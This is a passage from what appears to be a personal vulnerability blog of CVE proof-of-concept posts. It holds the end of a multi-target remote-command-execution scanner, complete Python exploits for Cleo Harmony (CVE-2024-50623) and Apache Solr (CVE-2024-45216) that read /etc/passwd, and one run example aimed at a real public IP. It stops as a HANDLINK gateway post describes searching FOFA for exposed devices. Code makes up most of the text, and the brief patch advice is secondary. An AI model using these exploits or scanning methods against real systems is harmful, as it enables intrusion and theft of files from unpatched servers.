class="built_in">print</span>(Fore.BLUE + f<span class="string">&quot;[*] Loaded &#123;len(urls)&#125; URLs from &#123;url_file&#125;&quot;</span>)</span><br><span class="line"></span><br><span class="line">        with ThreadPoolExecutor(max_workers=10) as executor:</span><br><span class="line">            futures = &#123;executor.submit(send_payload, url, <span class="built_in">command</span>): url <span class="keyword">for</span> url <span class="keyword">in</span> urls&#125;</span><br><span class="line">            completed = 0</span><br><span class="line">            total = len(urls)</span><br><span class="line"></span><br><span class="line">            <span class="keyword">for</span> future <span class="keyword">in</span> as_completed(futures):</span><br><span class="line">                url = futures[future]</span><br><span class="line">                completed += 1</span><br><span class="line">                try:</span><br><span class="line">                    target, success, output = future.result()</span><br><span class="line">                    <span class="built_in">print</span>(Fore.BLUE + f<span class="string">&quot;\n[*] Progress: &#123;completed&#125;/&#123;total&#125;&quot;</span>)</span><br><span class="line">                    <span class="built_in">print</span>(f<span class="string">&quot;\n=== Result for &#123;Fore.YELLOW&#125;&#123;target&#125;&#123;Fore.RESET&#125; ===&quot;</span>)</span><br><span class="line">                    <span class="keyword">if</span> success:</span><br><span class="line">                        <span class="built_in">print</span>(Fore.GREEN + <span class="string">&quot;[+] Command Output:&quot;</span>)</span><br><span class="line">                        <span class="built_in">print</span>(output)</span><br><span class="line">                    <span class="keyword">else</span>:</span><br><span class="line">                        <span class="built_in">print</span>(Fore.RED + f<span class="string">&quot;[-] Error: &#123;output&#125;&quot;</span>)</span><br><span class="line">                except Exception as e:</span><br><span class="line">                    <span class="built_in">print</span>(Fore.RED + f<span class="string">&quot;[-] Unexpected error with &#123;url&#125;: &#123;e&#125;&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">elif</span> mode == <span class="string">&#x27;-u&#x27;</span>:</span><br><span class="line">        <span class="keyword">if</span> len(sys.argv) != 4:</span><br><span class="line">            <span class="built_in">print</span>(Fore.RED + <span class="string">&quot;[-] Incorrect usage for single URL mode.&quot;</span>)</span><br><span class="line">            sys.exit(1)</span><br><span class="line">        url = sys.argv[2]</span><br><span class="line">        <span class="built_in">command</span> = sys.argv[3]</span><br><span class="line">        <span class="built_in">print</span>(Fore.BLUE + f<span class="string">&quot;[*] Target URL: &#123;url&#125;&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(Fore.BLUE + f<span class="string">&quot;[*] Sending RCE payload: &#123;command&#125;&quot;</span>)</span><br><span class="line"></span><br><span class="line">        target, success, output = send_payload(url, <span class="built_in">command</span>)</span><br><span class="line">        <span class="built_in">print</span>(f<span class="string">&quot;\n=== Result for &#123;Fore.YELLOW&#125;&#123;target&#125;&#123;Fore.RESET&#125; ===&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> success:</span><br><span class="line">            <span class="built_in">print</span>(Fore.GREEN + <span class="string">&quot;[+] Command Output:&quot;</span>)</span><br><span class="line">            <span class="built_in">print</span>(output)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(Fore.RED + f<span class="string">&quot;[-] Error: &#123;output&#125;&quot;</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(Fore.RED + f<span class="string">&quot;[-] Unknown mode: &#123;mode&#125;&quot;</span>)</span><br><span class="line">        sys.exit(1)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br><span class="line">       </span><br></pre></td></tr></table></figure>
The following code demonstrates how to execute the script:

<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">python test_poc.py -u http://192.168.0.1/images/index.html <span class="string">&quot;id&quot;</span></span><br><span class="line">python test_poc.py -f url.txt <span class="string">&quot;id&quot;</span></span><br></pre></td></tr></table></figure>
</code></pre>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://example.com/2025/04/01/Cleo-Harmony_CVE-2024-50623/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="Dong Cong">
      <meta itemprop="description" content="bW9ua2V5Y2RAZ21haWwuY29t">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="congdong007">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2025/04/01/Cleo-Harmony_CVE-2024-50623/" class="post-title-link" itemprop="url">Cleo Harmony File Transfer Software Arbitrary File Read Vulnerability(CVE-2024-50623) POC</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2025-04-01 14:53:15" itemprop="dateCreated datePublished" datetime="2025-04-01T14:53:15-04:00">2025-04-01</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2025-04-28 00:15:56" itemprop="dateModified" datetime="2025-04-28T00:15:56-04:00">2025-04-28</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/vulnerability/" itemprop="url" rel="index"><span itemprop="name">vulnerability</span></a>
                </span>
                  , 
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/vulnerability/Cleo-Harmony/" itemprop="url" rel="index"><span itemprop="name">Cleo Harmony</span></a>
                </span>
                  , 
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/vulnerability/Cleo-Harmony/CVE-2024-50623/" itemprop="url" rel="index"><span itemprop="name">CVE-2024-50623</span></a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <pre><code>Description

    Cleo has identified an unrestricted file upload and download vulnerability (CVE-2024-50623) that could lead to remote code execution.

    The vulnerability affects the following products:

    Cleo Harmony® (prior to version 5.8.0.21)
    Cleo VLTrader® (prior to version 5.8.0.21)
    Cleo LexiCom® (prior to version 5.8.0.21)
    Cleo strongly advises all customers to immediately upgrade instances of Harmony, VLTrader, and LexiCom to the latest released patch (version 5.8.0.21) to address additional discovered potential attack vectors of the vulnerability. 

    Please visit Unrestricted File Upload and Download Vulnerability Mitigation to take immediate action.

Scope of impact
</code></pre>
<p>   <img src="/images/vuln11.jpg"></p>
<pre><code>Proof of Concept (Python Code)

<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Title: Cleo Harmony File Transfer Software Arbitrary File Read Vulnerability(CVE-2024-50623)</span></span><br><span class="line"><span class="comment"># Date : 2025-04-01</span></span><br><span class="line"><span class="comment"># Author: Dong Cong</span></span><br><span class="line"><span class="comment">#         </span></span><br><span class="line"><span class="comment">#         ZXJpYy5jb25nZG9uZ0BnbWFpbC5jb20=</span></span><br><span class="line"><span class="comment"># </span></span><br><span class="line"><span class="comment"># CVE : 2024-50623</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#!/usr/bin/python3    </span></span><br><span class="line"></span><br><span class="line">import requests</span><br><span class="line">import argparse</span><br><span class="line">import warnings</span><br><span class="line"></span><br><span class="line">warnings.filterwarnings(<span class="string">&quot;ignore&quot;</span>)</span><br><span class="line"></span><br><span class="line">url0 = <span class="string">&#x27;/Synchronization&#x27;</span></span><br><span class="line"></span><br><span class="line">parser=argparse.ArgumentParser()</span><br><span class="line">parser.add_argument(<span class="string">&quot;--host&quot;</span>, <span class="built_in">help</span>=<span class="string">&quot;input the vulnerable host&quot;</span>, <span class="built_in">type</span>=str)</span><br><span class="line">args = parser.parse_args()</span><br><span class="line"></span><br><span class="line"><span class="comment"># http://xx.xx.xx.xx:xxxx</span></span><br><span class="line">host = args.host</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(host)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">cookies = &#123;</span><br><span class="line">    <span class="string">&#x27;csrftoken&#x27;</span>: <span class="string">&#x27;z1GtnjQWsIKwGazlFX7V&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;csrftoken&#x27;</span>: <span class="string">&#x27;NX6iujIUcamW9umprA1vx19dzU6EZNLa&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;csrftoken&#x27;</span>: <span class="string">&#x27;kZ4jVQ4uZtITYtnweSsVDUEwZ2ltraTF&#x27;</span>,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:136.0) Gecko/20100101 Firefox/136.0&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Accept&#x27;</span>: <span class="string">&#x27;*/*&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Accept-Language&#x27;</span>: <span class="string">&#x27;zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Connection&#x27;</span>: <span class="string">&#x27;keep-alive&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Priority&#x27;</span>: <span class="string">&#x27;u=4&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Retrieve&#x27;</span>: <span class="string">&#x27;l=Ab1234-RQ0258;n=VLTrader;v=7.2.1;a=1337;po=1337;s=True;b=False;pp=1337;path=../../etc/passwd&#x27;</span>,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">try:</span><br><span class="line">    response = requests.get(f<span class="string">&#x27;&#123;host&#125;&#123;url0&#125;&#x27;</span>, cookies=cookies, headers=headers,<span class="built_in">timeout</span>=5)</span><br><span class="line">    <span class="keyword">if</span> response.status_code == 200:</span><br><span class="line">        <span class="built_in">print</span>(f<span class="string">&#x27;************************ &#123;len(response.text)&#125; ************************\n&#x27;</span>)</span><br><span class="line">        <span class="built_in">print</span>(response.text)</span><br><span class="line">except requests.exceptions.HTTPError as http_err:</span><br><span class="line">    <span class="built_in">print</span>(f<span class="string">&quot;HTTP 错误: &#123;http_err&#125;&quot;</span>)</span><br><span class="line">except requests.exceptions.ConnectionError as conn_err:</span><br><span class="line">    <span class="built_in">print</span>(f<span class="string">&quot;连接错误: &#123;conn_err&#125;&quot;</span>)</span><br><span class="line">except requests.exceptions.Timeout as timeout_err:</span><br><span class="line">    <span class="built_in">print</span>(f<span class="string">&quot;请求超时: &#123;timeout_err&#125;&quot;</span>)</span><br><span class="line">except requests.exceptions.RequestException as req_err:</span><br><span class="line">    <span class="built_in">print</span>(f<span class="string">&quot;请求错误: &#123;req_err&#125;&quot;</span>)          </span><br></pre></td></tr></table></figure>

The following code demonstrates how to execute the script:

<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python test_poc.py --host http://192.168.0.1:8983</span><br></pre></td></tr></table></figure>
</code></pre>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://example.com/2024/12/01/vuln-CVE-2024-45216/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="Dong Cong">
      <meta itemprop="description" content="bW9ua2V5Y2RAZ21haWwuY29t">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="congdong007">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2024/12/01/vuln-CVE-2024-45216/" class="post-title-link" itemprop="url">Improper Authentication vulnerability in Apache Solr ( CVE-2024-45216 ) poc</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>
              

              <time title="Created: 2024-12-01 16:19:57 / Modified: 17:33:35" itemprop="dateCreated datePublished" datetime="2024-12-01T16:19:57-05:00">2024-12-01</time>
            </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/vulnerability/" itemprop="url" rel="index"><span itemprop="name">vulnerability</span></a>
                </span>
                  , 
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/vulnerability/Apache-Solr/" itemprop="url" rel="index"><span itemprop="name">Apache Solr</span></a>
                </span>
                  , 
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/vulnerability/Apache-Solr/CVE-2024-45216/" itemprop="url" rel="index"><span itemprop="name">CVE-2024-45216</span></a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <pre><code>Description
    An Improper Authentication vulnerability exists in Apache Solr, affecting versions:

        From 5.3.0 to versions before 8.11.4
            From 9.0.0 to versions before 9.7.0
    This vulnerability occurs when the PKIAuthenticationPlugin (enabled by default with Solr Authentication) allows for an authentication bypass. By appending a &quot;fake ending&quot; to the end of a Solr API URL path, malicious requests can bypass authentication. The fake path resembles an unprotected API endpoint, but it is stripped internally after authentication and before API routing, maintaining the appearance of a valid API URL.

Impact
    This vulnerability allows unauthorized access to sensitive Solr APIs, potentially compromising system integrity and exposing data.

Solution
    Users should upgrade to:

        Version 9.7.0 (for 9.x series)
        Version 8.11.4 (for 8.x series)

    These versions address and fix the issue.

Proof of Concept (Python Code)
    
    <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Title: Improper Authentication vulnerability in Apache Solr ( CVE-2024-45216 )</span></span><br><span class="line"><span class="comment"># Date : 2024-12-01</span></span><br><span class="line"><span class="comment"># Author: Dong Cong</span></span><br><span class="line"><span class="comment">#         </span></span><br><span class="line"><span class="comment">#         ZXJpYy5jb25nZG9uZ0BnbWFpbC5jb20=</span></span><br><span class="line"><span class="comment"># </span></span><br><span class="line"><span class="comment"># CVE : 2024-45216</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"></span><br><span class="line">import requests</span><br><span class="line">import json</span><br><span class="line">import argparse</span><br><span class="line">import warnings</span><br><span class="line"></span><br><span class="line">url0 = <span class="string">&#x27;/solr/admin/cores:/admin/info/key?indexInfo=false&amp;wt=json&#x27;</span></span><br><span class="line"></span><br><span class="line">url1 = <span class="string">&#x27;/solr/&#123;&#125;/config:/admin/info/key&#x27;</span></span><br><span class="line">url2 = <span class="string">&#x27;/solr/&#123;&#125;/debug/dump:/admin/info/key?param=ContentStreams&amp;stream.url=file:///etc/passwd&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">warnings.filterwarnings(<span class="string">&quot;ignore&quot;</span>)</span><br><span class="line"></span><br><span class="line">parser=argparse.ArgumentParser()</span><br><span class="line">parser.add_argument(<span class="string">&quot;--host&quot;</span>, <span class="built_in">help</span>=<span class="string">&quot;input the vulnerable host&quot;</span>, <span class="built_in">type</span>=str)</span><br><span class="line">args = parser.parse_args()</span><br><span class="line"></span><br><span class="line"><span class="comment"># http://xx.xx.xx.xx:8983</span></span><br><span class="line">host = args.host</span><br><span class="line"><span class="built_in">print</span>(host)</span><br><span class="line"></span><br><span class="line">headers1 = &#123;</span><br><span class="line">    <span class="string">&#x27;SolrAuth&#x27;</span>: <span class="string">&#x27;test&#x27;</span>,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">params1 = &#123;</span><br><span class="line">    <span class="string">&#x27;indexInfo&#x27;</span>: <span class="string">&#x27;false&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;wt&#x27;</span>: <span class="string">&#x27;json&#x27;</span>,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">headers2 = &#123;</span><br><span class="line">    <span class="string">&#x27;SolrAuth&#x27;</span>: <span class="string">&#x27;test&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Content-Type&#x27;</span>: <span class="string">&#x27;application/json&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.82Safari/537.36&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Accept&#x27;</span>: <span class="string">&#x27;text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9&#x27;</span>,</span><br><span class="line">    <span class="comment"># &#x27;Accept-Encoding&#x27;: &#x27;gzip, deflate&#x27;,</span></span><br><span class="line">    <span class="string">&#x27;Accept-Language&#x27;</span>: <span class="string">&#x27;zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7,zh-TW;q=0.6&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Connection&#x27;</span>: <span class="string">&#x27;close&#x27;</span>,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">headers3 = &#123;</span><br><span class="line"><span class="string">&#x27;SolrAuth&#x27;</span>: <span class="string">&#x27;test&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.82Safari/537.36&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;Accept&#x27;</span>: <span class="string">&#x27;text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9&#x27;</span>,</span><br><span class="line"><span class="comment"># &#x27;Accept-Encoding&#x27;: &#x27;gzip, deflate&#x27;,</span></span><br><span class="line"><span class="string">&#x27;Accept-Language&#x27;</span>: <span class="string">&#x27;zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7,zh-TW;q=0.6&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;Connection&#x27;</span>: <span class="string">&#x27;close&#x27;</span>,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">json_data = &#123;</span><br><span class="line">    <span class="string">&#x27;set-property&#x27;</span>: &#123;</span><br><span class="line">        <span class="string">&#x27;requestDispatcher.requestParsers.enableRemoteStreaming&#x27;</span>: True,</span><br><span class="line">    &#125;,</span><br><span class="line">&#125;    </span><br><span class="line"></span><br><span class="line">try:</span><br><span class="line">    response = requests.post(</span><br><span class="line">        f<span class="string">&#x27;&#123;host&#125;&#123;url0&#125;&#x27;</span>,</span><br><span class="line">        params=params1,</span><br><span class="line">        headers=headers1,</span><br><span class="line">        <span class="built_in">timeout</span>=10</span><br><span class="line">    )</span><br><span class="line">    <span class="keyword">if</span> response.status_code == 200 and <span class="string">&quot;application/json&quot;</span> <span class="keyword">in</span> response.headers.get(<span class="string">&quot;Content-Type&quot;</span>, <span class="string">&quot;&quot;</span>):</span><br><span class="line">        </span><br><span class="line">        <span class="built_in">print</span>(f<span class="string">&quot;&#123;host&#125; ---&gt; &#123;len(response.text)&#125; \n\n&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(response.text)  </span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;\n\n\n&#x27;</span> + <span class="string">&#x27;*&#x27;</span>*78 + <span class="string">&#x27;\n\n\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">        data1 = None</span><br><span class="line">        data1 = json.loads(response.text)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> data1 != None:</span><br><span class="line"></span><br><span class="line">            status_data = data1.get(<span class="string">&quot;status&quot;</span>, &#123;&#125;)</span><br><span class="line"></span><br><span class="line">            <span class="keyword">for</span> core_name, core_details <span class="keyword">in</span> status_data.items():</span><br><span class="line"></span><br><span class="line">                <span class="built_in">print</span>(f<span class="string">&quot;Core Name: &#123;core_name&#125;&quot;</span>)</span><br><span class="line">                temp_url = url1.format(core_name)</span><br><span class="line"></span><br><span class="line">                response = requests.post(f<span class="string">&#x27;&#123;host&#125;&#123;temp_url&#125;&#x27;</span>, headers=headers2, json=json_data,<span class="built_in">timeout</span>=10)                    </span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> response.status_code == 200 and len(response.text) &lt; 200:</span><br><span class="line">                    <span class="built_in">print</span>(f<span class="string">&#x27;&#123;host&#125;&#123;temp_url&#125; ---&gt; &#123;len(response.text)&#125; \n\n&#x27;</span>)</span><br><span class="line">                    <span class="built_in">print</span>(response.text)  </span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">&#x27;\n\n\n&#x27;</span> +<span class="string">&#x27;*&#x27;</span>*78 + <span class="string">&#x27;\n\n\n&#x27;</span>)                        </span><br><span class="line"></span><br><span class="line">                    temp_url = url2.format(core_name)</span><br><span class="line"></span><br><span class="line">                    response = requests.post(f<span class="string">&#x27;&#123;host&#125;&#123;temp_url&#125;&#x27;</span>, headers=headers2,<span class="built_in">timeout</span>=10)</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">if</span> response.status_code == 200:</span><br><span class="line">                        </span><br><span class="line">                        <span class="built_in">print</span>(f<span class="string">&#x27;&#123;host&#125;&#123;temp_url&#125; ---&gt; &#123;len(response.text)&#125; \n\n&#x27;</span>)</span><br><span class="line">                        <span class="built_in">print</span>(response.text)                        </span><br><span class="line"></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        pass</span><br><span class="line"></span><br><span class="line">except requests.exceptions.HTTPError as http_err:</span><br><span class="line">    pass<span class="comment">#print(f&quot;HTTP 错误: &#123;http_err&#125;&quot;)</span></span><br><span class="line">except requests.exceptions.ConnectionError as conn_err:</span><br><span class="line">    pass<span class="comment">#print(f&quot;连接错误: &#123;conn_err&#125;&quot;)</span></span><br><span class="line">except requests.exceptions.Timeout as timeout_err:</span><br><span class="line">    pass<span class="comment">#print(f&quot;请求超时: &#123;timeout_err&#125;&quot;)</span></span><br><span class="line">except requests.exceptions.RequestException as req_err:</span><br><span class="line">    pass<span class="comment">#print(f&quot;请求错误: &#123;req_err&#125;&quot;) </span></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

The following code demonstrates how to execute the script:

<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python test_poc.py --host http://122.51.176.242:8983</span><br></pre></td></tr></table></figure>
</code></pre>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://example.com/2024/11/12/vuln-handlink/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="Dong Cong">
      <meta itemprop="description" content="bW9ua2V5Y2RAZ21haWwuY29t">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="congdong007">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2024/11/12/vuln-handlink/" class="post-title-link" itemprop="url">HANDLINK-ISS-7000v2 Gateway login_handler.cgi Unauthorized RCE Vulnerability</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>
              

              <time title="Created: 2024-11-12 15:03:16 / Modified: 21:15:30" itemprop="dateCreated datePublished" datetime="2024-11-12T15:03:16-05:00">2024-11-12</time>
            </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/vulnerability/" itemprop="url" rel="index"><span itemprop="name">vulnerability</span></a>
                </span>
                  , 
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/vulnerability/HANDLINK-ISS-7000v2/" itemprop="url" rel="index"><span itemprop="name">HANDLINK-ISS-7000v2</span></a>
                </span>
                  , 
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/vulnerability/HANDLINK-ISS-7000v2/gate/" itemprop="url" rel="index"><span itemprop="name">gate</span></a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p>The HANDLINK-ISS-7000 v2 network gateway server, manufactured by Taiwan Hanlin Technology Co., Ltd., is a high-performance gateway solution designed for network authentication and billing in various hospitality settings.</p>
<p>A command execution vulnerability exists in ISS-7000 v2’s firmware versions 1.00.06 and 1.00.08, allowing attackers to obtain server privileges.</p>
<p>Vulnerability Reproduction Steps</p>
<ol>
<li>Device Discovery: Using the FOFA search engine, I searched for accessible HANDLINK-ISS-7000 v2 devices. The search yielded approximately 106 results.</li>
</ol>
<p>   <img src="/images/HANDLINK1.jpg"> </p>
<ol start="2">
